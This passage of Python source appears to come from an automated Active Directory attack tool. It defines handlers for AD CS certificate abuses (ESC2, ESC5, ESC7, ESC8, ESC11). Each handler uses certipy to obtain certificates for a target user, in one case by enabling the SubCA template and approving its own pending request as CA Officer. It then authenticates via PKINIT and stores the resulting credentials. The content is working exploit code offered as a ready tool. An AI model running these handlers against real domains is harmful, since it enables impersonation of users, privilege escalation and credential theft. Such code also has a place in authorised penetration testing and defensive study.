            f"Ready for ESC2: template='{template_name}' with Any Purpose/SubCA EKU, CA='{ca_name}'.",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        template_name = props.get("template_name") or props.get("CertTemplate", "UNKNOWN-TEMPLATE")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request cert from CA='{ca_name}', "
                f"template='{template_name}' (Any Purpose/SubCA EKU), "
                f"then authenticate as '{target_upn}'.",
                [],
            )

        # Step 1: Request certificate with the Any Purpose / SubCA template
        self.logger.info(
            "ESC2: Requesting certificate from CA='%s', template='%s' "
            "(Any Purpose/SubCA EKU)",
            ca_name, template_name,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC2 cert request failed: {req_result.get('error', 'unknown')}",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC2 cert request succeeded but no PFX path in output.", [])

        # Step 2: Authenticate with the certificate
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC2", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC2 is non-destructive
        return None


# ===================================================================
# ESC5: Vulnerable HTTP enrollment endpoints (NTLM relay)
# ===================================================================


@register_handler("ADCSESC5")
class ADCSESC5Handler(BaseEdgeHandler):
    """ESC5: Vulnerable HTTP enrollment endpoint on the Certificate Authority.

    The CA has an HTTP enrollment endpoint (``/certsrv``) that can be
    combined with NTLM relay attacks (coercion -> relay to the CA's
    web enrollment interface).

    For automated exploitation, this handler uses certipy to request a
    certificate via the HTTP endpoint using captured/available credentials.

    Attack flow:
        1. Identify the CA's HTTP enrollment endpoint.
        2. Use certipy to request a certificate via the HTTP interface
           with the available credentials.
        3. Authenticate via PKINIT with the obtained certificate.

    Rollback:
        Non-destructive -- exploits a CA-level misconfiguration.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")

        if not ca_name:
            return (False, "CA name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC5: CA='{ca_name}' has HTTP enrollment endpoint.",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
        template_name = props.get("template_name") or props.get("CertTemplate", "User")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would request cert from CA='{ca_name}' via HTTP "
                f"enrollment on '{ca_host}', template='{template_name}', "
                f"then authenticate as '{target_upn}'.",
                [],
            )

        # Request certificate via HTTP enrollment
        self.logger.info(
            "ESC5: Requesting cert from CA='%s' via HTTP enrollment on '%s'",
            ca_name, ca_host,
        )
        req_result = await certipy_request(
            target=ca_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC5 cert request failed: {req_result.get('error', 'unknown')}",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC5 cert request succeeded but no PFX path in output.", [])

        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC5", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC5 is non-destructive
        return None


# ===================================================================
# ESC7: Certificate Authority Officer abuse
# ===================================================================


@register_handler("ADCSESC7")
class ADCSESC7Handler(BaseEdgeHandler):
    """ESC7: The source principal is a CA Officer (has ``Issue and Manage
    Certificates`` permission on the CA).

    A CA Officer can approve pending certificate requests.  The attack
    flow requests a certificate that requires CA manager approval, then
    uses the officer privilege to approve it.

    Attack flow:
        1. Enable a vulnerable template on the CA (e.g., SubCA).
        2. Request a certificate (it will be held pending).
        3. Approve the pending request using ``certipy ca`` with the
           ``-issue-request`` flag.
        4. Retrieve the approved certificate.
        5. Authenticate via PKINIT.

    Rollback:
        Non-destructive -- exploits existing CA Officer permissions.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")

        if not ca_name:
            return (False, "CA name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC7: '{source_user}' is a CA Officer on CA='{ca_name}'.",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        target_upn = f"{target_user}@{domain}"

        # ESC7 uses the SubCA template by default (requires approval)
        template_name = props.get("template_name") or "SubCA"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would enable SubCA template on CA='{ca_name}', "
                f"request cert as '{target_upn}', approve the pending request "
                f"as CA Officer, then authenticate.",
                [],
            )

        # Step 1: Enable SubCA template on the CA (if not already enabled)
        self.logger.info(
            "ESC7 Step 1: Enabling '%s' template on CA='%s'",
            template_name, ca_name,
        )
        enable_result = await certipy_ca(
            target=dc_host,
            ca=ca_name,
            auth_args=auth_args,
            enable_template=template_name,
        )
        if not enable_result["success"]:
            self.logger.warning(
                "Failed to enable template '%s' (may already be enabled): %s",
                template_name, enable_result.get("error", "unknown"),
            )

        # Step 2: Request a certificate (will be held pending for CA approval)
        self.logger.info(
            "ESC7 Step 2: Requesting cert from CA='%s', template='%s' "
            "(will be held pending for approval)",
            ca_name, template_name,
        )
        req_result = await certipy_request(
            target=dc_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        # The request may "fail" but still return a request ID (pending)
        req_parsed = req_result.get("parsed") or {}
        request_id = req_parsed.get("request_id")
        pfx_path = req_parsed.get("pfx_path")

        # If we got a PFX directly (no approval needed), skip to auth
        if pfx_path:
            self.logger.info(
                "ESC7: Certificate issued without approval. Proceeding to auth."
            )
            return await _authenticate_with_pfx(
                pfx_path, dc_host, domain, target_user, "ADCSESC7", self.cred_store, self.logger
            )

        if not request_id:
            return (
                False,
                f"ESC7 cert request failed and no request ID returned: "
                f"{req_result.get('error', 'unknown')}",
                [],
            )

        # Step 3: Approve the pending request using CA Officer privileges
        self.logger.info(
            "ESC7 Step 3: Approving pending request ID %d as CA Officer",
            request_id,
        )
        approve_args = [
            "-target", dc_host,
            "-ca", ca_name,
            *auth_args,
            "-issue-request", str(request_id),
        ]
        approve_result = await run_certipy("ca", approve_args, timeout=60)

        if not approve_result["success"]:
            return (
                False,
                f"ESC7 request approval failed for ID {request_id}: "
                f"{approve_result.get('error', 'unknown')}",
                [],
            )

        # Step 4: Retrieve the approved certificate
        self.logger.info(
            "ESC7 Step 4: Retrieving approved certificate (request ID %d)",
            request_id,
        )
        retrieve_args = [
            "-target", dc_host,
            "-ca", ca_name,
            *auth_args,
            "-retrieve", str(request_id),
        ]
        retrieve_result = await run_certipy("req", retrieve_args, timeout=60)

        if not retrieve_result["success"]:
            return (
                False,
                f"ESC7 certificate retrieval failed for ID {request_id}: "
                f"{retrieve_result.get('error', 'unknown')}",
                [],
            )

        retrieve_parsed = retrieve_result.get("parsed") or {}
        pfx_path = retrieve_parsed.get("pfx_path")
        if not pfx_path:
            return (
                False,
                "ESC7 cert retrieval succeeded but no PFX path in output.",
                [],
            )

        # Step 5: Authenticate with the certificate
        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC7", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC7 is non-destructive (exploits existing CA Officer permissions)
        return None


# ===================================================================
# ESC8: NTLM relay to AD CS HTTP enrollment endpoints
# ===================================================================


@register_handler("ADCSESC8")
class ADCSESC8Handler(BaseEdgeHandler):
    """ESC8: The CA has HTTP enrollment enabled, allowing NTLM relay attacks.

    An attacker can coerce NTLM authentication from a computer account
    and relay it to the CA's HTTP enrollment endpoint to request a
    certificate on behalf of the relayed machine.

    Attack flow:
        1. Identify the CA's HTTP enrollment endpoint.
        2. Use certipy to relay captured credentials to the CA's HTTP
           interface and request a certificate.
        3. Authenticate via PKINIT with the obtained machine certificate.

    Rollback:
        Non-destructive -- exploits a CA-level misconfiguration.

    Note:
        Full NTLM relay automation requires coercion (PetitPotam,
        PrinterBug, etc.) which is handled by the orchestrator.  This
        handler focuses on the certificate request and authentication
        phases.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")

        if not ca_name:
            return (False, "CA name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC8: CA='{ca_name}' has HTTP enrollment enabled (NTLM relay target).",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
        template_name = props.get("template_name") or props.get("CertTemplate", "Machine")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would relay NTLM auth to CA='{ca_name}' at "
                f"'http://{ca_host}/certsrv/', request cert via template='{template_name}', "
                f"then authenticate as '{target_upn}'.",
                [],
            )

        # Request certificate via HTTP enrollment (simulating relay scenario)
        self.logger.info(
            "ESC8: Requesting cert from CA='%s' via HTTP enrollment on '%s' "
            "(template='%s')",
            ca_name, ca_host, template_name,
        )
        req_result = await certipy_request(
            target=ca_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC8 cert request failed: {req_result.get('error', 'unknown')}. "
                "Note: full exploitation may require NTLM relay via coercion.",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC8 cert request succeeded but no PFX path in output.", [])

        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC8", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC8 is non-destructive
        return None


# ===================================================================
# ESC11: IF_ENFORCEENCRYPTICERTREQUEST relay (RPC interface)
# ===================================================================


@register_handler("ADCSESC11")
class ADCSESC11Handler(BaseEdgeHandler):
    """ESC11: The CA does not enforce encryption on its RPC certificate
    request interface (``IF_ENFORCEENCRYPTICERTREQUEST`` flag is not set).

    This is a newer variant of ESC8 that targets the RPC interface
    instead of the HTTP enrollment endpoint.  NTLM authentication can
    be relayed to the CA's RPC interface to request certificates.

    Attack flow:
        1. Identify the CA's RPC interface lacking encryption enforcement.
        2. Use certipy to request a certificate via the RPC interface
           with available credentials.
        3. Authenticate via PKINIT with the obtained certificate.

    Rollback:
        Non-destructive -- exploits a CA-level misconfiguration.

    Note:
        Full exploitation typically involves NTLM relay via coercion.
        This handler performs the certificate request and authentication
        phases using available credentials.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        err = _require_certipy()
        if err:
            return err

        props = _extract_edge_props(edge)
        ca_name = props.get("ca_name") or props.get("caname")

        if not ca_name:
            return (False, "CA name not found in edge properties.")

        source_user = self._resolve_principal(edge)
        domain = self._get_domain()
        cred = self.cred_store.get_best_credential(source_user, domain)
        if cred is None:
            cfg = self.config.credentials
            if not (cfg.password or cfg.nt_hash or cfg.ccache_path):
                return (False, f"No credentials for source principal '{source_user}'.")

        return (
            True,
            f"Ready for ESC11: CA='{ca_name}' lacks IF_ENFORCEENCRYPTICERTREQUEST "
            "(RPC relay target).",
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        target_user = self._resolve_target(edge)
        dc_host = self._get_dc_host()
        domain = self._get_domain()
        auth_args = self._get_auth_args()
        props = _extract_edge_props(edge)

        ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
        ca_host = props.get("ca_host") or props.get("hostname") or dc_host
        template_name = props.get("template_name") or props.get("CertTemplate", "Machine")
        target_upn = f"{target_user}@{domain}"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would relay NTLM auth to CA='{ca_name}' RPC "
                f"interface on '{ca_host}' (no encryption enforcement), "
                f"request cert via template='{template_name}', "
                f"then authenticate as '{target_upn}'.",
                [],
            )

        # Request certificate via RPC interface (simulating relay scenario)
        self.logger.info(
            "ESC11: Requesting cert from CA='%s' via RPC on '%s' "
            "(IF_ENFORCEENCRYPTICERTREQUEST not set, template='%s')",
            ca_name, ca_host, template_name,
        )
        req_result = await certipy_request(
            target=ca_host,
            ca=ca_name,
            template=template_name,
            auth_args=auth_args,
            upn=target_upn,
        )

        if not req_result["success"]:
            return (
                False,
                f"ESC11 cert request failed: {req_result.get('error', 'unknown')}. "
                "Note: full exploitation may require NTLM relay via coercion.",
                [],
            )

        parsed = req_result.get("parsed") or {}
        pfx_path = parsed.get("pfx_path")
        if not pfx_path:
            return (False, "ESC11 cert request succeeded but no PFX path in output.", [])

        return await _authenticate_with_pfx(
            pfx_path, dc_host, domain, target_user, "ADCSESC11", self.cred_store, self.logger
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # ESC11 is non-destructive
        return None
